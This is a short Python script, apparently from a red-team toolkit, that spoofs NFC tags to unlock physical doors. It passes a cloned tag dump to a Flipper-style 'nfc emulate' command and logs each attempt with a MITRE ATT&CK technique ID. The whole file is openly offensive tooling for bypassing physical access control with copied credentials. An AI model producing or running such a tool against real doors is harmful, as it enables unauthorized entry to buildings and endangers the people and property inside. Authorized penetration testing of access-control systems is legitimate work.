#!/usr/bin/env python3
# Spoofs NFC tags to unlock physical doors (via PN532/Flipper/etc.)

import argparse, os, time, subprocess, json
from datetime import datetime

LOG_FILE = "results/nfc_door_spoofer_logs.json"
MITRE_TTP = "T1557.003"

def log_entry(entry):
    os.makedirs("results", exist_ok=True)
    data = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            data = json.load(f)
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def spoof_nfc(tag_dump):
    print(f"[+] Spoofing NFC tag from {tag_dump}...")
    try:
        subprocess.run(["flipper", "nfc", "emulate", tag_dump], timeout=20)
        return True
    except Exception as e:
        print(f"[!] Spoof failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Spoof NFC tag to unlock doors")
    parser.add_argument("--tag", required=True, help="Path to .nfc tag dump file")
    args = parser.parse_args()

    success = spoof_nfc(args.tag)
    log_entry({
        "timestamp": datetime.utcnow().isoformat(),
        "spoofed_tag": args.tag,
        "success": success,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
